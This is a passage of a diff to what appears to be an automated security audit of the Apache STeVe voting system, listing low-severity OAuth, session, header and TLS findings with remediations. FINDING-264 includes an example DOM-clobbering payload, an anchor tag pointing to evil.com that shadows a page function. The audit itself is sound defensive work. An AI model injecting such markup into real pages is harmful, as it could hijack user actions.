-The method returns the full set of voter PIDs (identities of who voted) alongside tally results. While knowing *who* voted (not *how*) may be legitimate for participation tracking, returning a full identity set to the caller provides more data than may be needed for simply displaying results. If the web layer exposes this to unauthorized users, it reveals voting participation patterns. This may be intentional for audit purposes (showing voter turnout). The severity is LOW because the votes themselves remain anonymous (shuffled and unlinkable to specific PIDs).
+The OAuth authorization URL (OAUTH_URL_INIT) does not include a client_id parameter. In standard OAuth 2.0 (RFC 6749 §4.1.1), the client_id is REQUIRED in the authorization request and is the mechanism by which the authorization server can scope the issued token to a specific audience. Without client_id: 1) The OAuth server cannot issue audience-restricted tokens, 2) If the same OAuth provider's private key signs tokens for multiple relying parties, any token is valid everywhere, 3) A token obtained by visiting another ASF application (sharing the same OAuth server) could be replayed against STeVe. This enables cross-service token replay where a token issued for a less-sensitive ASF service could be used to authenticate to STeVe (the voting system), which has higher security requirements due to election integrity concerns.
 
 **Remediation:**
 
-Return voter count instead of full PID set for display purposes and provide separate method for authorized audit access. Implement two methods: tally_issue() returning m.tally(votes, self.json2kv(issue.kv)), len(voters) for display, and tally_issue_with_voters() returning the full voters set for authorized audit only.
+Include client_id in OAuth requests:
 
----
-
-#### FINDING-244: Token Handling Cannot Be Fully Verified Without asfquart Library Inspection
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 10.1.1 |
-| Files | v3/server/main.py:40-43 |
-| Source Reports | 10.1.1.md |
-| Related | None | **Description:**
-
-The OAuth authorization code flow is configured with server-side token exchange, which is the correct pattern for keeping tokens away from the browser. The OAUTH_URL_CALLBACK URL format suggests the authorization code is exchanged server-side. However, without visibility into: 1) The asfquart library's token handling, 2) Whether access/refresh tokens are ever sent to the browser via cookies or response bodies, 3) Whether the session cookie contains tokens or only a session identifier, full compliance cannot be confirmed. The architectural pattern appears correct based on available code.
-
-**Remediation:**
-
-Verify token confinement in asfquart (ASVS 10.1.1): Confirm that the session cookie contains only a session identifier (not embedded tokens) and that access/refresh tokens are stored server-side only.
-
----
-
-#### FINDING-245: Missing nonce Parameter for OpenID Connect
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 10.1.2, 10.5.1 |
-| Files | v3/server/main.py:39-42 |
-| Source Reports | 10.1.2.md, 10.5.1.md |
-| Related | None | **Description:**
-
-The authentication request URL template includes state and redirect_uri parameters but does NOT include a nonce parameter. Per OIDC Core Section 3.1.2.1, the nonce parameter should be included in authentication requests and then validated in the returned ID token to mitigate replay attacks. Additionally, the comment in create_app() explicitly states '# Avoid OIDC', indicating the application is intentionally bypassing OIDC in favor of a custom OAuth flow. This means OIDC-standard protections like nonce validation are not implemented. An attacker who captures an ID token (e.g., from browser history, logs, or XSS) could replay it against the application. Without nonce binding, the attacker could obtain a victim's ID token from a previous session, present the captured token to the application, and the application would accept it as valid since there is no nonce to tie the token to a specific authentication request.
-
-**Remediation:**
-
-Generate a cryptographically random nonce for each authentication request using secrets.token_urlsafe(32), store it in the session, include it in the authorization request URL, and validate it in the returned ID token. Example: nonce = secrets.token_urlsafe(32); session['oauth_nonce'] = nonce; OAUTH_URL_INIT = 'https://oauth.apache.org/auth?state=%s&redirect_uri=%s&nonce=%s'. In the token validation callback, verify that id_token_claims.get('nonce') matches session.get('oauth_nonce'), raise a SecurityError if mismatched, and delete the session nonce after single use.
-
----
-
-#### FINDING-246: OAuth authorization URL does not include explicit scope parameter
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3, L2 |
-| CWE | N/A |
-| ASVS sections | 10.2.3, 10.4.11 |
-| Files | v3/server/main.py:40 |
-| Source Reports | 10.2.3.md, 10.4.11.md |
-| Related | None | **Description:**
-
-The OAuth authorization URL template does not include a `scope` parameter. This means either: 1. The authorization server applies default scopes (potentially broader than needed), or 2. The `asfquart` framework appends scope parameters elsewhere (not visible), or 3. The ASF OAuth system doesn't use scopes and grants a fixed set of claims. Based on the application's session usage (`basic_info()` reads `uid`, `fullname`, `email`), the application only needs identity information. If the authorization server grants additional permissions by default (e.g., write access to ASF services), this would violate the principle of least privilege. If the authorization server grants broader permissions than necessary by default, any token theft would grant the attacker more access than the application actually requires.
-
-**Remediation:**
-
-Add an explicit scope parameter to the OAuth authorization URL template: `asfquart.generics.OAUTH_URL_INIT = ('https://oauth.apache.org/auth?state=%s&redirect_uri=%s&scope=openid+profile+email')`. Or if ASF OAuth uses custom scopes, request only what's needed for the application's functionality. Document and enforce explicit mapping between OAuth scopes and application-level permissions.
-
----
-
-#### FINDING-247: OAuth scope to application permission mapping not explicit
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 10.4.11 |
-| Files | v3/server/pages.py |
-| Source Reports | 10.4.11.md |
-| Related | None | **Description:**
-
-The application uses role-based access control (R.committer, R.pmc_member) but these roles appear to be derived from the session/token data, not from OAuth scopes. The mapping between OAuth scopes and application-level permissions is not explicit in the provided code. If the authorization server grants overly broad scopes, the application's internal RBAC may be the only control preventing scope abuse. The application has its own authorization layer, but the principle of defense-in-depth suggests scopes should also be constrained at the OAuth level.
-
-**Remediation:**
-
-Document and enforce explicit mapping between OAuth scopes and application-level permissions. Ensure OAuth scopes are also constrained at the authorization server level to support defense-in-depth.
-
----
-
-#### FINDING-248: Token Audience Validation Not Verifiable in OAuth Callback
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 10.3.1 |
-| Files | v3/server/pages.py |
-| Source Reports | 10.3.1.md |
-| Related | None | **Description:**
-
-The application does not appear to function as a traditional OAuth resource server that accepts bearer tokens. Instead, it uses session-based authentication established through an OAuth login flow. All protected endpoints use @asfquart.auth.require decorators which check session validity, not access token audience claims. However, the initial token received from the authorization server during the OAuth callback should ideally have its audience validated by the asfquart framework before establishing the session. This validation occurs in framework code not provided for audit. If the asfquart framework does not validate the audience of tokens received during the OAuth callback, a token intended for a different ASF application could potentially be used to establish a session in this application (token confusion attack).
-
-**Remediation:**
-
-Verify that the asfquart framework validates the aud claim (or equivalent) in any tokens received from the authorization server before establishing a local session.
-
----
-
-#### FINDING-249: Cannot verify redirect URI validation with exact string comparison on external authorization server
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | N/A |
-| ASVS sections | 10.4.1 |
-| Files | v3/server/main.py:39-42 |
-| Source Reports | 10.4.1.md |
-| Related | None | **Description:**
-
-This requirement applies to the authorization server (OAuth AS), not to the OAuth client. The application delegates authorization to oauth.apache.org, which is the entity responsible for validating redirect URIs against a client-specific allowlist using exact string comparison. From the client perspective, the redirect_uri is passed as %s in the template URL. The actual value is determined by the asfquart framework. We cannot verify from this codebase: 1) Whether the authorization server (oauth.apache.org) validates redirect URIs with exact string matching, 2) What redirect URI value the asfquart framework substitutes, 3) Whether the client's registered redirect URIs are restricted to specific paths. If the authorization server does not perform exact string comparison on redirect URIs, an attacker could potentially redirect the authorization response (containing the code) to a malicious endpoint. Additionally, if the asfquart framework dynamically constructs the redirect_uri from the request Host header, there could be an open redirect vulnerability on the client side.
-
-**Remediation:**
-
-In create_app(), explicitly set the redirect_uri to a fixed value rather than relying on dynamic construction: FIXED_REDIRECT_URI = 'https://steve.apache.org/oauth/callback' and asfquart.generics.OAUTH_URL_INIT = (f'https://oauth.apache.org/auth?state=%s&redirect_uri={FIXED_REDIRECT_URI}'). Additionally, verify with ASF OAuth team that: 1) Redirect URIs are validated with exact string comparison, 2) No wildcard or pattern matching is used, 3) The client registration includes only the specific callback URL.
-
----
-
-#### FINDING-250: response_mode parameter not explicitly specified in authorization request
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 10.4.12 |
-| Files | v3/server/main.py:39 |
-| Source Reports | 10.4.12.md |
-| Related | None | **Description:**
-
-The authorization request does not specify a response_mode parameter. The default response_mode for the authorization code flow is query (code returned as a query parameter in the redirect URI). For this application acting as a server-side confidential client using the authorization code flow, response_mode=query is acceptable. However, the authorization server should be configured to reject requests with response_mode=fragment or other modes that this client doesn't need. Since this application is not the authorization server, this requirement primarily applies to the ASF OAuth server configuration, which is outside the scope of the provided code. If the authorization server allows the client to use response_mode=fragment, an attacker could potentially craft authorization requests that deliver the code via the fragment, which would not be sent to the server and could be intercepted by client-side scripts.
-
-**Remediation:**
-
-This is a server-side configuration item for oauth.apache.org. From the client perspective, explicitly specify response_mode to make the intent clear: asfquart.generics.OAUTH_URL_INIT = ('https://oauth.apache.org/auth?state=%s&redirect_uri=%s&response_mode=query')
-
----
-
-#### FINDING-251: Authorization Code Lifetime and One-Time Use Cannot Be Verified from Client Code
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | N/A |
-| ASVS sections | 10.4.2, 10.4.3 |
-| Files | v3/server/main.py:42 |
-| Source Reports | 10.4.2.md, 10.4.3.md |
-| Related | None | **Description:**
-
-These requirements apply to the authorization server (oauth.apache.org), which must ensure authorization codes: 1) Can only be used once (10.4.2), 2) Have a maximum lifetime of 10 minutes (L1/L2) or 1 minute (L3) (10.4.3). From the client perspective, the application receives the authorization code in the callback and immediately exchanges it via the token endpoint. There is no client-side code that stores or delays the use of authorization codes. The asfquart framework processes the callback and exchanges the code in the same request flow. The code lifetime and one-time use enforcement is entirely controlled by the external authorization server. The client-side behavior (immediate exchange) is appropriate and does not contribute to code lifetime or replay issues. If the authorization server allows codes to be valid for too long or permits code reuse, the window for code interception and replay attacks increases.
-
-**Remediation:**
-
-Verify with the ASF OAuth team that oauth.apache.org: 1) Enforces single-use authorization codes and revokes any tokens issued if the code is reused, 2) Authorization codes expire within 10 minutes (or 1 minute for L3). Ensure the asfquart framework does not cache or retry code exchanges. Consider implementing PKCE (RFC 7636) on the client side to mitigate code interception attacks. The client-side code is appropriate — no changes needed on the client.
-
----
-
-#### FINDING-252: No user-facing interface for revoking OAuth tokens or active sessions
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | CWE-613 |
-| ASVS sections | 10.4.9 |
-| Files | v3/server/pages.py |
-| Source Reports | 10.4.9.md |
-| Related | None | **Description:**
-
-The application provides no user-facing interface for revoking OAuth tokens or active sessions. While the application has /profile and /settings pages, neither appears to offer session/token revocation capabilities. If a user's session or tokens are compromised (e.g., stolen OAuth tokens from malicious clients), the user has no way to revoke those tokens through the application's interface. They would need to go directly to oauth.apache.org to revoke tokens. Since this application is an OAuth client rather than an authorization server, the primary responsibility for token revocation UI lies with the authorization server (ASF OAuth). However, a well-designed relying party should provide a 'sign out of all sessions' or 'revoke access' capability, or at minimum link to the IdP's token management interface.
-
-**Remediation:**
-
-Add a session management page or a 'revoke all sessions' action that: 1. Invalidates local sessions, 2. Optionally calls the ASF OAuth revocation endpoint (if available), 3. Provides users visibility into active sessions
-
----
-
-#### FINDING-253: User identification may not explicitly map to OIDC sub claim
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | CWE-287 |
-| ASVS sections | 10.5.2 |
-| Files | v3/server/pages.py:82-91 |
-| Source Reports | 10.5.2.md |
-| Related | FINDING-255 | **Description:**
-
-The application identifies users via 's['uid']' from the session, which is used consistently across the codebase for all authorization decisions. This 'uid' field is the ASF username (Apache ID) which maps to the LDAP 'uid' attribute. While the code does use a stable identifier, it's not clear whether this maps to the OIDC 'sub' claim specifically. The comment 'Avoid OIDC' in main.py suggests the application may be receiving a custom user identifier from ASF's OAuth, which may or may not have the same non-reassignment guarantees as an OIDC 'sub' claim. However, given that the ASF OAuth system uses Apache IDs which are non-reassignable by ASF policy, this is a low-severity observation rather than a vulnerability. If ASF ever changes their OAuth to return reassignable identifiers, the application would not detect the difference.
-
-**Remediation:**
-
-Explicitly document the user identification strategy and add issuer scoping. Example: s = await asfquart.session.read(); if s: # User identified by ASF UID (equivalent to OIDC 'sub' claim); # ASF UIDs are non-reassignable per ASF policy; basic.update(uid=s['uid'], issuer='https://oauth.apache.org', name=s['fullname'], email=s['email'])
-
----
-
-#### FINDING-254: No Documented Fallback for Missing Authentication Strength Information
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | CWE-1008 |
-| ASVS sections | 6.8.4 |
-| Files | v3/server/pages.py |
-| Source Reports | 6.8.4.md |
-| Related | None | **Description:**
-
-No documented fallback approach exists for when the IdP doesn't provide authentication strength information. Per ASVS 6.8.4, if the IdP does not provide this information, the application must have a documented fallback approach that assumes that the minimum strength authentication mechanism was used. The codebase has no documentation or code indicating awareness of this requirement. The '### need general solution' comments on auth decorators suggest this is a known gap. Without a documented fallback, there's no clear security posture regarding authentication strength assumptions.
-
-**Remediation:**
-
-Create explicit documentation stating that the application assumes minimum authentication strength (single-factor) since ASF OAuth doesn't provide acr/amr claims. If ASF OAuth does provide these claims, implement validation. Document the fallback policy clearly in security documentation and code comments.
-
----
-
-#### FINDING-255: Potential Multi-IdP Identity Spoofing Risk if Additional IdPs Added
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | CWE-287 |
-| ASVS sections | 6.8.1 |
-| Files | v3/server/pages.py:86-95, main.py:40-43 |
-| Source Reports | 6.8.1.md |
-| Related | FINDING-253 | **Description:**
-
-The application uses a single IdP (ASF OAuth at https://oauth.apache.org/), so the multi-IdP identity spoofing scenario doesn't directly apply. The uid from the session is used consistently as the user identifier across all operations (election creation, voting, document access). Since there's only one IdP configured in main.py, the risk of cross-IdP spoofing is effectively eliminated by architecture. However, if additional IdPs were added in the future without namespacing user IDs (e.g., prefixing with IdP identifier), this would become a critical vulnerability.
-
-**Remediation:**
-
-The requirement is effectively satisfied by design through single-IdP architecture. If additional IdPs are added in the future, implement namespaced user identifiers (e.g., asf-oauth:username) to prevent cross-IdP spoofing.
-
----
-
-#### FINDING-256: Self-disclosure of PersonDB synchronization status
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | CWE-203 |
-| ASVS sections | 6.3.8 |
-| Files | v3/server/pages.py:406-416 |
-| Source Reports | 6.3.8.md |
-| Related | None | **Description:**
-
-The admin_page() function reveals whether an authenticated user's OAuth identity has been synchronized into the local PersonDB through a distinct error response ('Unknown Person'). While this only affects the currently authenticated user viewing their own status, it creates a distinguishable response pattern. The application delegates authentication entirely to ASF OAuth, so traditional login/registration/forgot-password enumeration vectors are not present. This finding is informational rather than exploitable for user enumeration since it only shows the user their own synchronization status.
-
-**Remediation:**
-
-No immediate action required. The distinct error only reveals the user's own synchronization status to themselves. This is a self-disclosure pattern with minimal security impact.
-
----
-
-#### FINDING-257: Incomplete Data-Specific Access Rules Documentation
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | N/A |
-| ASVS sections | 8.1.1 |
-| Files | v3/docs/schema.md |
-| Source Reports | 8.1.1.md |
-| Related | None | **Description:**
-
-Data-specific access rules for election isolation are partially documented. The documentation explains that elections use unique EIDs and that mayvote restricts voting access, but does not explicitly document that access to one election's data must not grant access to another election's data, nor does it specify the complete set of data-specific restrictions. Missing is an explicit statement that election management operations are restricted to the specific election's owner_pid or authz group members, and that data from different elections is isolated.
-
-**Remediation:**
-
-Add explicit data-level access documentation stating isolation requirements per election. Document that: (1) election management operations are restricted to the specific election's owner_pid or authz group members, (2) data from different elections is isolated (queries are scoped by EID), (3) access to one election's data does not grant access to another election's data, (4) the mayvote table enforces voter eligibility on a per-election, per-issue basis. Include this in a dedicated 'Data Isolation' section in schema.md.
-
----
-
-#### FINDING-258: No Real-Time Notification for Election State Changes
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 8.3.2 |
-| Files | v3/steve/election.py |
-| Source Reports | 8.3.2.md |
-| Related | None | **Description:**
-
-When an election is closed, any voter with the voting page already loaded can still submit their form, which will fail with a state error. The authorization change (election closed = no more voting) IS applied immediately in the database (add_vote checks self.S_OPEN), but there's no mitigating control to alert voters mid-session that the election state has changed. This is partially mitigated by _all_metadata(self.S_OPEN) in add_vote which validates state on every vote submission, ensuring closed elections immediately reject votes. However, the user experience is poor as voters may spend time filling out ballots only to have submission fail.
-
-**Remediation:**
-
-Implement a real-time notification mechanism to alert active voters when election state changes occur. Options include: (1) WebSocket connection to push state change notifications to active voting pages, (2) periodic AJAX polling to check election state and display warning banner if state changed, (3) optimistic UI validation before form submission to check current state and warn user before they invest time in ballot completion. This improves user experience and prevents wasted effort on ballots that will be rejected due to state changes.
-
----
-
-#### FINDING-259: Session Identity Correctly Used - No Intermediary Permission Escalation
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 8.3.3 |
-| Files | v3/server/pages.py, v3/steve/election.py |
-| Source Reports | 8.3.3.md |
-| Related | None | **Description:**
-
-The application is a monolithic server with direct database access. There are no service-to-service calls, no intermediary services, and no token forwarding patterns. All operations use result.uid (from the authenticated session) directly. The application correctly uses the originating subject's identity for all permission decisions. No findings detected for this requirement in the current architecture. This is documented as a positive finding to confirm compliance with ASVS 8.3.3.
-
-**Remediation:**
-
-No remediation required. The application correctly uses the originating subject's identity for all permission decisions. Continue to maintain direct identity propagation from session to data layer. If the architecture evolves to include service-to-service calls or intermediary services, ensure that the originating subject's identity is propagated and used for all authorization decisions rather than the intermediary's permissions.
-
----
-
-#### FINDING-260: Logout functionality nested in dropdown menu reduces visibility
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 7.4.4 |
-| Files | v3/server/templates/header.ezt:31-39 |
-| Source Reports | 7.4.4.md |
-| Related | None | **Description:**
-
-The logout functionality exists but is nested within a dropdown menu that requires two clicks to access (click username dropdown, then click "Sign Out"). While this is a common UI pattern, it reduces visibility. The requirement states "easy and visible access" — a nested dropdown partially meets this but may fail strict interpretation. Users under session-hijacking attack may not quickly find the logout option.
-
-**Remediation:**
-
-While the current implementation follows common web patterns (similar to GitHub, GitLab), consider adding a visible logout icon/button directly in the navbar for higher visibility. Add a dedicated logout link with an icon directly in the navbar navigation items for immediate visibility without requiring dropdown interaction.
-
----
-
-#### FINDING-261: No documentation of expected session lifetime behavior between RP and IdP
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 7.6.1 |
-| Files | v3/server/pages.py, v3/server/templates/header.ezt |
-| Source Reports | 7.6.1.md |
-| Related | None | **Description:**
-
-There is no documentation of the expected session lifetime behavior between this application (RP) and the ASF SSO provider (IdP). The login (/auth?login=/) and logout (/auth?logout=/) endpoints delegate to asfquart but session lifetime policies are not explicitly configured or documented in the application code. Without documented session behavior, it's impossible to verify correct implementation. Operations teams cannot validate that session termination at the IdP properly propagates to this application, and vice versa.
-
-**Remediation:**
-
-Document and configure session behavior explicitly in application configuration. Define SESSION_LIFETIME (max session duration), IDP_REAUTH_INTERVAL (re-verify with IdP interval), IDLE_TIMEOUT, and document that logout at /auth?logout=/ terminates both RP session and IdP session (single logout). Example: APP.config.update(SESSION_LIFETIME=3600, IDP_REAUTH_INTERVAL=1800, IDLE_TIMEOUT=900).
-
----
-
-#### FINDING-262: No Session Creation Notification to User
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | N/A |
-| ASVS sections | 7.6.2 |
-| Files | v3/server/pages.py:69-100 |
-| Source Reports | 7.6.2.md |
-| Related | None | **Description:**
-
-After OAuth callback creates a new session, there is no mechanism to notify users or provide visibility into session creation events. Per ASVS 7.6.2's intent (derived from NIST 800-63C), users should be aware when sessions are created on their behalf. The data flow: OAuth callback completes successfully → New session created in asfquart framework → User redirected to protected page → No indication that new session was created → User may be unaware of active session state. Users lack awareness of when sessions are created, making it difficult to detect unauthorized session creation. This reduces user ability to identify potential security issues and does not align with the principle of informed consent for session establishment.
-
-**Remediation:**
-
-Implement session creation notifications in the OAuth callback handler. After successful session creation, display a flash message indicating 'New session created. If you did not initiate login, please contact support.' Store session creation timestamp in session data. Add a session management page at /account/sessions that displays active sessions and creation timestamps, allowing users to view and manage their sessions.
-
----
-
-#### FINDING-263: Missing URL encoding in JavaScript form action construction
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | N/A |
-| ASVS sections | 1.2.2 |
-| Files | v3/server/templates/manage.ezt:339, v3/server/templates/manage.ezt:348, v3/server/templates/manage.ezt:357 |
-| Source Reports | 1.2.2.md |
-| Related | None | **Description:**
-
-The issueId JavaScript variable (passed from server-rendered onclick attributes) is concatenated directly into a URL path without encoding in manage.ezt template. While IIDs are cryptographically generated and thus safe in practice, the pattern doesn't apply URL encoding to untrusted data used in URL construction. Impact is low because IIDs are server-generated alphanumeric values with no user control over their format.
-
-**Remediation:**
-
-Apply encodeURIComponent to all URL path parameters: form.action = `/do-edit-issue/[eid]/${encodeURIComponent(issueId)}`;
-
----
-
-#### FINDING-264: Global window function assignments could be overridden via DOM clobbering
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | N/A |
-| ASVS sections | 3.2.3 |
-| Files | v3/server/templates/vote-on.ezt |
-| Source Reports | 3.2.3.md |
-| Related | None | **Description:**
-
-Multiple functions are assigned to the window object (openSTVModal, saveSTVRanking, clearSTVRanking, bulkVote, clearYNAVotes, toggleDescription, toggleAllDescriptions, submitVotes). If unescaped HTML content contains named elements like `<a id="submitVotes" href="https://evil.com">`, and JavaScript code later accesses `window.submitVotes` without type checking, the element reference could shadow the function. Impact is Low because modern browsers resolve `window.X` to function assignments over named elements when both exist. However, if the function assignment fails (e.g., due to a syntax error caused by XSS in `STV_CANDIDATES`), the named element would be accessible via `window.X`.
-
-**Remediation:**
-
-Add type checking before invocation: `const submitFn = window.submitVotes; if (typeof submitFn !== 'function') { console.error('submitVotes has been overridden'); return; }`
-
----
-
-#### FINDING-265: JSON Endpoints Use Content-Type That Triggers Preflight But Lack Explicit CORS Policy
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS Section(s) | 3.5.2 |
-| Affected File(s) | v3/server/pages.py:360-366 |
-| Source Report(s) | 3.5.2.md |
-| Related Finding(s) | - | **Description:**
-
-The client sends Content-Type: application/json (from manage.ezt line 251), which is non-safelisted and would trigger a CORS preflight. However, without explicit CORS configuration visible in the code, it is unclear whether the server properly rejects unauthorized origins during the OPTIONS preflight. If a permissive CORS policy were added in the future (e.g., Access-Control-Allow-Origin: *), these endpoints would become vulnerable. Protection is implicit rather than explicit.
-
-**Remediation:**
-
-Add explicit CORS policy configuration that restricts allowed origins, and validate Content-Type server-side. Explicitly verify Content-Type is application/json and reject with 415 if not. Example: if quart.request.content_type != 'application/json': quart.abort(415, 'Content-Type must be application/json')
-
----
-
-#### FINDING-266: Unable to Verify Hostname Separation — Single Application Serves All Functionality
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 3.5.4 |
-| Affected File(s) | v3/server/pages.py:entire file |
-| Source Report(s) | 3.5.4.md |
-| Related Finding(s) | - | **Description:**
-
-The application serves administrative functions (/admin, /manage), voter functions (/voter, /vote-on), static files (/static), and document files (/docs) all from the same application instance. There is no evidence of: separate hostnames for admin vs. voter functionality, separate origins for static content, or domain-based cookie scoping. The code uses a single APP instance with all routes registered in one file, suggesting a single-origin deployment. If a vulnerability (e.g., XSS) exists in one area of the application, it can access cookies and data from all other areas since they share the same origin. Administrative session cookies are accessible from voter-facing pages and vice versa.
-
-**Remediation:**
-
-Consider separating administrative and voter functionality onto different subdomains: admin.steve.example.com — Election management, vote.steve.example.com — Voter interface, static.steve.example.com — Static assets (with restrictive CSP).
-
----
-
-#### FINDING-267: No Global X-Content-Type-Options: nosniff Header to Prevent Content-Type Sniffing
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 3.5.7 |
-| Affected File(s) | v3/server/pages.py:all endpoints |
-| Source Report(s) | 3.5.7.md |
-| Related Finding(s) | - | **Description:**
-
-The application does not set the X-Content-Type-Options: nosniff header on any response. No after-request handler or middleware adds this header globally. Without this header, browsers may MIME-sniff responses and interpret non-JavaScript content as executable scripts, creating potential XSSI exploitation vectors for non-script responses. This is primarily a defense-in-depth gap since authenticated HTML pages won't parse as valid JavaScript, but it represents a missing security control that could prevent certain attack variants.
-
-**Remediation:**
-
-Add a global after-request handler to set the X-Content-Type-Options: nosniff header on all responses:
-
-@APP.after_request
-async def add_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    return response
-
----
-
-#### FINDING-268: No Cookie Size Validation Before Writing Cookies
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 3.3.5 |
-| Affected File(s) | v3/server/pages.py:Application-wide |
-| Source Report(s) | 3.3.5.md |
-| Related Finding(s) | - | **Description:**
-
-The application does not explicitly validate that cookie name and value length combined do not exceed 4096 bytes before writing cookies. While unlikely in normal operation (flash messages are consumed on next page load and session data is minimal), a rapid sequence of operations or very long election titles in flash messages could theoretically push the cookie size near the limit. If cookie exceeds 4096 bytes, the browser silently drops the cookie and the user loses their session.
-
-**Remediation:**
-
-Add middleware to check cookie size before sending:
-
-@app.after_request
-async def check_cookie_size(response):
-    for header_name, header_value in response.headers:
-        if header_name.lower() == 'set-cookie':
-            cookie_content = header_value.split(';')[0]
-            if len(cookie_content.encode('utf-8')) > 4096:
-                _LOGGER.warning(f'Cookie exceeds 4096 bytes: {len(cookie_content)} bytes')
-                # Handle gracefully - truncate flash messages or use server-side sessions
-    return response
-
----
-
-#### FINDING-269: Encrypted Client Hello (ECH) Not Configured
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS Section(s) | 12.1.5 |
-| Affected File(s) | v3/server/main.py, v3/server/config.yaml.example |
-| Source Report(s) | 12.1.5.md |
-| Related Finding(s) | - | **Description:**
-
-No ECH (Encrypted Client Hello) configuration exists anywhere in the codebase. Without ECH, the Server Name Indication (SNI) field in the TLS ClientHello is transmitted in plaintext. This allows network observers (ISPs, network administrators, or attackers performing passive surveillance) to determine which hostname the client is connecting to, even though the payload is encrypted. This is a metadata privacy issue. ECH is a TLS 1.3 extension (RFC 9578, formerly ESNI) that is still relatively new and requires DNS infrastructure support (HTTPS/SVCB DNS records with ECH configuration), server-side TLS library support (OpenSSL 3.x+ with ECH patches, or BoringSSL). Python's ssl module does not natively support ECH configuration as of Python 3.12.
-
-**Remediation:**
-
-This is a Level 3 requirement. Implementation requires: 1. Deploy behind a reverse proxy that supports ECH (e.g., Cloudflare, nginx with ECH patches) 2. Publish ECH keys via DNS HTTPS records 3. Document ECH configuration in deployment guides. Example DNS record for ECH support: _443._https.steve.apache.org. IN HTTPS 1 . ech="&lt;base64-encoded ECH config&gt;"
-
----
-
-#### FINDING-270: LDAP Connection Security Not Verified in Architecture
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 12.3.1 |
-| Affected File(s) | v3/docs/quickstart.md:38-44, v3/ARCHITECTURE.md |
-| Source Report(s) | 12.3.1.md |
-| Related Finding(s) | - | **Description:**
-
-The system connects to an LDAP server for user data loading via the asf-load-ldap.py script. There is no documentation indicating whether: 1) LDAPS (LDAP over TLS) or StartTLS is used, 2) Certificate validation is performed, 3) Credentials in bind.txt are transmitted securely. If LDAP connections use plaintext LDAP (port 389) without StartTLS, credentials and user data are transmitted unencrypted.
-
-**Remediation:**
-
-Ensure the LDAP loading script uses LDAPS (port 636) or StartTLS with certificate validation, and document this requirement. Verify OAuth Client TLS by auditing the asfquart library to confirm certificate validation is enabled and cannot be accidentally disabled. Add certificate validation for LDAP in asf-load-ldap.py.
-
----
-
-#### FINDING-271: No Documented Enforcement of TLS Between Application and Reverse Proxy
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🔵 Low |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS Section(s) | 12.3.3 |
-| Affected File(s) | v3/ARCHITECTURE.md, v3/server/config.yaml.example:22 |
-| Source Report(s) | 12.3.3.md |
-| Related Finding(s) | - | **Description:**
-
-The architecture states a proxy sits in front of the application server. The communication between the proxy and the application backend is not explicitly configured to use TLS. If the TLS configuration is left blank (as the config allows), the proxy-to-application link would be unencrypted. In a typical deployment: External client → Proxy (TLS terminated) → Application server (plain HTTP on port 58383). This internal hop may be unencrypted if the application's certfile/keyfile are not set. If the proxy and application are on different hosts or cross a network boundary, internal traffic between them could be intercepted. This is a lower severity concern if both are on the same host/container.
-
-**Remediation:**
-
